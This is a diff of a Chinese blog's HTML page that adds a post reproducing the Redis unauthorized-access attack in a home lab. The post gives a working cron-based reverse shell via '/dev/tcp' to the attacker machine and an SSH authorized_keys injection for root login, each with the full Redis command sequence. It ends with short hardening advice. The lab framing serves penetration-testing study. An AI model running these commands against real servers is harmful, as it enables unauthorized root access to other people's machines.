@@ -154,6 +154,113 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/12/redis-unauthorized/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="沫">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="沫的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/02/12/redis-unauthorized/" class="post-title-link" itemprop="url">redis未授权攻击复现</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-02-12 13:51:00" itemprop="dateCreated datePublished" datetime="2020-02-12T13:51:00+08:00">2020-02-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-02-13 13:37:35" itemprop="dateModified" datetime="2020-02-13T13:37:35+08:00">2020-02-13</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="攻击准备"><a href="#攻击准备" class="headerlink" title="攻击准备"></a>攻击准备</h3><p><span style="color:blue;">一台安装了redis的linux服务器作为靶机,并且配置了ssh密钥登陆，我靶机ip地址：192.168.0.9 ubuntu系统</span><br><img src="/images/pasted-43.png" alt="upload successful"></p>
+<p><span style="color:blue;">攻击主机 macos 同样安装了redis服务，ip地址：192.168.0.14<span style="color:blue;"><br><img src="/images/pasted-44.png" alt="upload successful"><br><span style="color:blue;">攻击主机 kali，ip地址：192.168.0.111<span style="color:blue;"></p>
+<p><img src="/images/pasted-46.png" alt="upload successful"></p>
+<h3 id="redis未授权配置不当漏洞介绍"><a href="#redis未授权配置不当漏洞介绍" class="headerlink" title="redis未授权配置不当漏洞介绍"></a>redis未授权配置不当漏洞介绍</h3><p>因为redis服务默认是没有任何密码，并且开放暴露在公网下，配置了如下这个参数，不合理的配置会让黑客拿到ssh密钥从而拿到服务器控制权</p>
+<h3 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h3><p><span style="color:blue;">配置了这个参数你才拥有远程读写权限，不然是无法进行操作的</span></p>
+<p><img src="/images/pasted-41.png" alt="upload successful"></p>
+<pre><code>protected-mode&quot;no&quot; 修改redis的保护模式为no，不启用</code></pre><p><span style="color:blue;">使用配置文件启动redis，我的redis配置文件在/etc/redis/下</span></p>
+<p><img src="/images/pasted-42.png" alt="upload successful"></p>
+<p><span style="color:blue;">启动redis服务器</span></p>
+<p><img src="/images/pasted-45.png" alt="upload successful"></p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h6 id="1-收集服务器开放端口使用nmap进行扫描"><a href="#1-收集服务器开放端口使用nmap进行扫描" class="headerlink" title="1.收集服务器开放端口使用nmap进行扫描"></a>1.收集服务器开放端口使用nmap进行扫描</h6><p><span style="color:blue;">可能是内网吧。他扫描我65535个端口只用了0.00071毫秒，还显示出了我的服务器系统是ubuntu,我对外开放了22和6379端口，22端口是远程连接，6379是redis服务器默认端口</span><br><img src="/images/pasted-47.png" alt="upload successful"></p>
+<h6 id="2-连接6379端口并且判断是否存在漏洞"><a href="#2-连接6379端口并且判断是否存在漏洞" class="headerlink" title="2.连接6379端口并且判断是否存在漏洞"></a>2.连接6379端口并且判断是否存在漏洞</h6><p><span style="color:blue;">远程连接成功</span><br><img src="/images/pasted-48.png" alt="upload successful"></p>
+<p><span style="color:blue;">判读是否存在漏洞可以尝试写入一个值到内存中，如果成功那么就存在</span><br><img src="/images/pasted-49.png" alt="upload successful"></p>
+<h3 id="攻击的几种方式"><a href="#攻击的几种方式" class="headerlink" title="攻击的几种方式"></a>攻击的几种方式</h3><h6 id="1-反弹shell"><a href="#1-反弹shell" class="headerlink" title="1.反弹shell"></a>1.反弹shell</h6><p>利用计划任务执行命令反弹shell<br>如果redis是root权限运行可以写crontab来反弹sehll</p>
+<p><span style="color:blue;">nc创建一个tcp监听</span><br><img src="/images/pasted-50.png" alt="upload successful"></p>
+<p><span style="color:blue;">执行这些命令将会在定时任务时反弹shell，写入一个exp 到/var/spool/cron/root 文件里</span></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">192.168.0.9:6379&gt; set x &quot;\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.0.111&#x2F;7999 0&gt;&amp;1\n&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.0.9:6379&gt; CONFIG set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;</span><br><span class="line">OK</span><br><span class="line">192.168.0.9:6379&gt; CONFIG set dbfilename root</span><br><span class="line">OK</span><br><span class="line">192.168.0.9:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">192.168.0.9:6379&gt;</span><br></pre></td></tr></table></figure>
+<p><span style="color:blue;">root文件里的exp</span><br><img src="/images/pasted-51.png" alt="upload successful"></p>
+<p><span style="color:blue;">接收到的shell成功获取对方电脑的控制权</span><br><img src="/images/pasted-53.png" alt="upload successful"></p>
+<h6 id="2-通过上传ssh-keygen公钥进行登陆"><a href="#2-通过上传ssh-keygen公钥进行登陆" class="headerlink" title="2.通过上传ssh-keygen公钥进行登陆"></a>2.通过上传ssh-keygen公钥进行登陆</h6><p>redis服务器使用root权限启动</p>
+<p>服务器开放了ssh服务器，并且允许使用密钥登陆服务器</p>
+<p><span style="color:blue;">先在本地生成一对密钥</span></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sshkeygen -t rsa</span><br></pre></td></tr></table></figure>
+
+<p><span style="color:blue;">创建的密钥和文件</span><br><img src="/images/pasted-54.png" alt="upload successful"></p>
+<p><span style="color:blue;">把公钥使用redis写进去</span></p>
+<p><img src="/images/pasted-55.png" alt="upload successful"></p>
+<p><span style="color:blue;">为了避免和其余数据冲突并且，避开其余文件在这里重选择一个库进行公钥写入</span></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">192.168.0.9:6379&gt; SELECT 3</span><br><span class="line">OK</span><br><span class="line">192.168.0.9:6379[3]&gt; keys *</span><br><span class="line">(empty list or set)</span><br><span class="line">192.168.0.9:6379[3]&gt; CONFIG set dir &#x2F;.ssh&#x2F;</span><br><span class="line">OK</span><br><span class="line">192.168.0.9:6379[3]&gt; config set dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">192.168.0.9:6379[3]&gt; set mo &quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOc4zrrtXhi&#x2F;I85YFWLE1dphLXDbTTooc08iN75FhwsFtfLpH69RsBbVY+SRL6veEyfwDcPrZNMGVeWyzheur9UggMwlgyBsIHzLDf&#x2F;m3N1BVjlEjcMlIuldDxumZvQXd&#x2F;Ox+ZvAI5MWUDVUZ+oA7U6Pkd0WdX&#x2F;&#x2F;&#x2F;aa5k1ptQoyKvvmzs53MywBEu+hZkcVrDiWPzeztrG2hWQKNaIfV5jBqRJENHvf++hUHofK3kVUn1l32PbBgdWnN3jZgzU0uGSBdFL6e0RIlRQKbVHpqajAG7H5NXNx1ODBxfve6BJIf4BhslK5HKa17nRUdWwYiMJTfSl0Y1R+8MBBqpntGPF root@mo \n\n\n&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.0.9:6379[3]&gt; save</span><br></pre></td></tr></table></figure>
+<p><img src="/images/pasted-56.png" alt="upload successful"><br><span style="color:blue;">对服务器进行登陆还是root权限简直爽歪歪</span></p>
+<p><img src="/images/pasted-57.png" alt="upload successful"><br><span style="color:blue;">通过redis未授权漏洞写入的授权文件</span><br><img src="/images/pasted-58.png" alt="upload successful"></p>
+<h3 id="安全配置避免被攻击"><a href="#安全配置避免被攻击" class="headerlink" title="安全配置避免被攻击"></a>安全配置避免被攻击</h3><p>低权限运行redis，并且在不必要的情况下不对外网进行开放，如果需要给自己的redis设置高强度密码防止爆破。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/10/giterror/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -758,14 +865,14 @@ sign参数和token参数，from参数和to参数可以选择固定也可以选�
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-count">16</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
